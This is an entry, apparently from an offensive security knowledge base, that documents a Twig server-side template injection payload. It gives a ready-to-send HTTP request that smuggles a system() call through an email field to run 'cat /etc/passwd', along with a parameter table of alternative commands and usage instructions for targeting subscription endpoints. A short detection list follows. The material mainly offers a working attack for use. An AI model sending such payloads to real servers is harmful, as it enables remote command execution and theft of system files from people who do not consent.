---
type: code
language: http
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - SSTI
  - Twig
  - command-injection
  - payload
platforms:
  - Web
  - PHP
validated: true
---

# Twig-SSTI-Command-Injection-via-Email-Filter

## Code

```http
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

## Description

This HTTP request exploits a subscription endpoint by injecting a command into the query string and using Twig's filter() on the email parameter with 'system' options to execute it. The filter processes the query as input, enabling command injection during email validation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /subscribe?0=cat+/etc/passwd | Endpoint and injected command (0 as index) | /subscribe?0=whoami |
| 0,0,1024 | Filter parameters: index, start, length | 0,0,1024 |
| {'options':'system'} | Filter options to invoke system command | {'options':'exec'} |
| attacker.tld | Attacker domain for email | evil.com |

## Usage

Send via curl or proxy to endpoints validating emails with Twig filters. The query command executes via the filter, with results potentially in response or side-channel. Integrates with [[procedures/Exploit-Twig-SSTI-for-Remote-Code-Execution]] for targeted RCE in forms.

## Detection

- Inspect POST bodies for Twig expressions in email fields.
- Log filter() calls with 'system' options or query injections.
- Monitor for command output in subscription confirmations or errors.

## Related

- [[procedures/Exploit-Twig-SSTI-for-Remote-Code-Execution]]
